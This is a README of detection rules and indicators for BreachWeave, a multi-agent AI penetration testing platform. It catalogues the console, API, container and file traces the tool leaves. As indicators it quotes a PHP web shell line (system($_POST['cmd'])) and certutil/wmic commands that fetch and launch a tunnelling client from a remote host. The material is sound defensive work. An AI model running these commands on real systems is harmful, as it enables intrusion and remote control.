# BreachWeave Detection Rules and IOCs

Part of [Agentic Attack Detections](../../README.md). Shared indicators and feeds live at the repository root; the rules for behaviors that every agentic framework shows are in [`behaviors/`](../../behaviors).

Detection rules, hunting queries and indicators for **BreachWeave**, a multi-agent penetration testing platform written in TypeScript on Bun and the pi-mono agent SDK. A manager (planner) schedules solver agents, each solver runs in its own Kali container named `tch-solver-<id>`, and an observer agent watches each solver and keeps its idea and memory board. The `main` branch (package name `tch-agent`) is built for the Tencent Cloud Hackathon intelligent penetration challenge, where the team placed first, and talks to the contest platform API. The `pentest` branch renames the product BreachWeave and replaces the contest API with local projects and assets. No public report of BreachWeave used in an intrusion was found.

| | |
|---|---|
| Tool | [m-sec-org/BreachWeave](https://github.com/m-sec-org/BreachWeave), reviewed at `bc2d9502` (`main`, October 9, 2026) and `6957a55f` (`pentest`, October 9, 2026). No releases, tags or published container images |
| Platforms | Microsoft Sentinel and Defender XDR, Sigma, Suricata, YARA, STIX 2.1 |
| Docs | [What BreachWeave leaves behind](source-code-signals.md), [where to start](hunting-order.md) and the [coverage matrix](coverage.md) |
| Status | Experimental. Written from the CLI, web server, runtime, prompts and skills source on both branches; the payload and wordlist skill folders were not read. Suricata cases are built from the server and prompt source. Baseline every rule on your own data before alerting |

## What BreachWeave leaves behind

The short version. The full review is in [source-code-signals.md](source-code-signals.md).

| Signal | What it looks like | Code |
|---|---|---|
| Web console | Bun.serve on `127.0.0.1:3000` (`web -l host:port` rebinds it), plain HTTP. Title `tch-agent` on `main`, `BreachWeave` on `pentest` with an inline `window.__tchResizeObserverPatched` script. No favicon | `apps/cli/src/main.ts:11,133`, `packages/ui-web/src/index.html:6` |
| No authentication on `main` | Every API route is open, including `GET /api/config/providers`, which returns stored model API keys in clear, and `POST /api/runtime/solvers`, which starts a solver container | `packages/ui-web/src/server.ts:400-1080` |
| Open self-registration on `pentest` | JWT login, but `POST /api/auth/register` is open unless `tch.auth.registrationEnabled` is set to false; `GET /api/auth/settings` answers `{"registrationEnabled":true}` without a token; event streams carry the JWT as `?token=` | `pentest: packages/ui-web/src/server.ts:428-509`, `packages/core/src/config/index.ts:1202` |
| Solver containers | `docker run -i --platform linux/amd64 --network host --name tch-solver-<id> ... tch-agent:latest /opt/tch-agent/tch-agent solver rpc --env TCH_...`; image built with `--label ai.tch-agent.dockerfile-sha256=<hash>` | `packages/core/src/runtime/runtime.ts:427-443,566-588`, `helpers.ts:10,179-180` |
| Host files | `~/.tch-agent/config` (auth.json, models.json, provider-prefs.json, settings.json, users.json), `~/.tch-agent/solvers/<id>`, `archive_solvers`, `challenge`, `runtime/self/tch-agent-linux-x64` | `packages/core/src/config/index.ts:234-235`, `runtime/types.ts:8-9` |
| Prompts in model traffic | Observer prompt `你是 CTF 解题 Agent 的 observer sidecar`, search prompt `你是网络安全领域的智能搜索助手`, solver prompt naming the `Tencent Cloud Hackathon - Smart Penetration Challenge`; Kimi `$web_search` requests at temperature 0.6 with thinking disabled | `observer-agent.ts:11`, `security-kimi-search.ts:82-100,394-406`, `kimi-security.md:34` |
| Redis web root playbook | `redis_test.php` checked with a POST of `cmd=RCOK`, `redis_diag.php` printing `DIAG_START` and `disable_functions`, `redis_exec.php` running `system($_POST['cmd'])` | `skills/builtin/redis-webroot-rce/SKILL.md:68-127` |
| NPS client hand-off | `certutil -urlcache -split -f http://<bridge>:44944/files/nps/npc_windows_amd64.exe C:\Users\Public\npc.exe`, then `wmic process call create "...npc.exe -server=<bridge>:44944 -vkey=auto"` | `redis-webroot-rce/SKILL.md:147-148`, `intranet-pentest/SKILL.md:416-417` |

## What is in this folder

| Folder | Contents |
|---|---|
| [`sentinel/hunting/`](sentinel/hunting) | 4 KQL hunts: BreachWeave on a host, the watchlist sweep, Redis web root pages, NPS downloads and console calls in web and proxy logs, and NPS client staging on hosts |
| [`sentinel/analytics/`](sentinel/analytics) | 1 scheduled analytics rule: the NPS client fetched or started the way the skills do it |
| [`sigma/`](sigma) | 5 Sigma rules: console, solver container and image build processes, NPS client staging, BreachWeave files, NPS downloads and console streams in proxy logs, and Redis web root pages in web logs |
| [`suricata/`](suricata) | Rules for the console page, API answers and event streams, prompts and search requests in cleartext model traffic, the challenge platform client, the Redis web root steps and NPS client downloads |
| [`yara/`](yara) | Rules for the tch-agent binaries and source, the solver image Dockerfile, the host config files and the Redis web root pages |

Indicators are in [`../../iocs/indicators.csv`](../../iocs/indicators.csv) with `framework` set to `breachweave`.

## Limits

- The console binds to `127.0.0.1` unless the operator passes `-l`. Exposure rules only matter for consoles the operator opened to a network.
- Model traffic goes over TLS to the provider. The prompt rules see it only on a plain-HTTP model gateway (the code has `baseUrlMappings` for one) or behind a TLS-inspecting proxy.
- The Redis and NPS steps are prompt text in shipped skills, not code. A model can change file names and arguments, and operators can edit the skills in `~/.tch-agent/config/skills`.
- A match means BreachWeave, not necessarily an attacker: it is published for contests and authorized testing. Check who ran it and whether the test was agreed.
